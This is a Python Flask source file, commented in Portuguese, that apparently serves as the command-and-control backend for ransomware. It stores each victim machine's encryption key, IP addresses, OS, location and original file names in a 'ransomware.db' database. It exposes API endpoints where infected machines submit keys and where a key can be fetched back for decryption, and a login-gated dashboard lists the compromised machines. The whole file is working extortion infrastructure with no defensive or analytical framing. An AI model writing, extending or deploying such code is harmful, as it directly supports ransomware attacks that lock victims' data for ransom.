from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify
import sqlite3
import datetime
import os

app = Flask(__name__)
app.secret_key = 'sua_chave_secreta_aqui'  # Chave secreta para sessões

# Usuários de exemplo
users = {
    "admin": "password123",
    "user1": "mypassword"
}

# Rota para a página de login
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        # Validação do usuário
        if username in users and users[username] == password:
            session['username'] = username  # Armazena o usuário na sessão
            flash('Login realizado com sucesso!', 'success')
            return redirect(url_for('index'))
        else:
            flash('Nome de usuário ou senha incorretos!', 'danger')
            return redirect(url_for('login'))
    
    return render_template('login.html')

# Página protegida
@app.route('/')
def index():
    if 'username' in session:
        with sqlite3.connect("ransomware.db") as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT machine_id, machine_name, ip_address, public_ip, os_info, encryption_key, location, execution_time FROM keys")
            rows = cursor.fetchall()
        return render_template('index.html', user=session['username'], rows=rows)
    else:
        flash('Por favor, faça login para acessar essa página.', 'warning')
        return redirect(url_for('login'))

# Rota para logout
@app.route('/logout')
def logout():
    session.pop('username', None)  # Remove o usuário da sessão
    flash('Você foi desconectado.', 'info')
    return redirect(url_for('login'))

# Configuração do banco de dados SQLite
def init_db():
    with sqlite3.connect("ransomware.db") as conn:
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS keys (
                       id INTEGER PRIMARY KEY AUTOINCREMENT,
                       machine_id TEXT NOT NULL,
                       encryption_key TEXT NOT NULL,
                       machine_name TEXT NOT NULL,
                       ip_address TEXT NOT NULL,
                       public_ip TEXT NOT NULL,
                       os_info TEXT NOT NULL,
                       location TEXT NOT NULL,
                       execution_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                       )
            """)
        conn.commit()

# Rota que permite adicionar uma nova chave ao banco de dados via uma requisição POST.
@app.route('/api/keys/add', methods=['POST'])
def add_key():
    data = request.json
    machine_id = data.get('machine_id', 'Desconhecido')
    encryption_key = data.get('encryption_key', 'Desconhecido')
    machine_name = data.get('machine_name', 'Desconhecido')
    ip_address = data.get('ip_address', 'Desconhecido')
    public_ip = data.get('public_ip', 'Desconhecido')
    os_info = data.get('os_info', 'Desconhecido')
    location = data.get('location', 'Desconhecido')
    file_names = data.get('file_names', '{}')  # Recebe o arquivo JSON com os nomes dos arquivos.
    execution_time = datetime.datetime.now()  # Captura em tempo real

    # Salvar o arquivo JSON no servidor
    json_dir = "json_files"
    os.makedirs(json_dir, exist_ok=True)
    json_path = os.path.join(json_dir, f"{machine_id}_file_names.json")
    with open(json_path, 'w') as json_file:
        json_file.write(file_names)

    with sqlite3.connect("ransomware.db") as conn:
        cursor = conn.cursor()
        cursor.execute("INSERT INTO keys (machine_id, encryption_key, machine_name, ip_address, public_ip, os_info, location, execution_time) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", (machine_id, encryption_key, machine_name, ip_address, public_ip, os_info, location, execution_time))
        conn.commit()

    return jsonify({"message": "Key stored successfully"}), 200

# Rota para obter a chave de criptografia associada a um machine_id
@app.route('/api/keys/<machine_id>', methods=['GET'])
def get_key(machine_id):
    with sqlite3.connect("ransomware.db") as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT encryption_key FROM keys WHERE machine_id = ?", (machine_id,))
        row = cursor.fetchone()
    
    if row:
        # Inclui o envio do arquivo JSON com os nomes originais
        file_name = f"{machine_id}_file_names.json"
        file_path = os.path.join("json_files", file_name)
        if os.path.exists(file_path):
            with open(file_path, 'r') as json_file:
                file_names = json_file.read()
            return jsonify({"encryption_key": row[0], "file_names": file_names}), 200
        else:
            return jsonify({"encryption_key": row[0], "message": "Arquivo de nomes não encontrado"})
    else:
        return jsonify({"message": "Chave não encontrada"}), 404

# Rota para exclusão no servidor
@app.route('/delete/<machine_id>', methods=['POST'])
def delete_key(machine_id):
    try:
        with sqlite3.connect("ransomware.db") as conn:
            cursor = conn.cursor()
            
            # Exclui o registro da tabela
            cursor.execute("DELETE FROM keys WHERE machine_id = ?", (machine_id,))
            
            # Exclui o arquivo JSON associado
            json_file_path = os.path.join("json_files", f"{machine_id}_file_names.json")
            if os.path.exists(json_file_path):
                os.remove(json_file_path)
            
            conn.commit()
        
        return redirect('/')
    except Exception as e:
        print(f"Erro ao excluir a chave: {e}")
        return "Erro ao excluir a chave", 500

if __name__ == '__main__':
    init_db()
    app.run(host='192.168.74.123', port=5000)
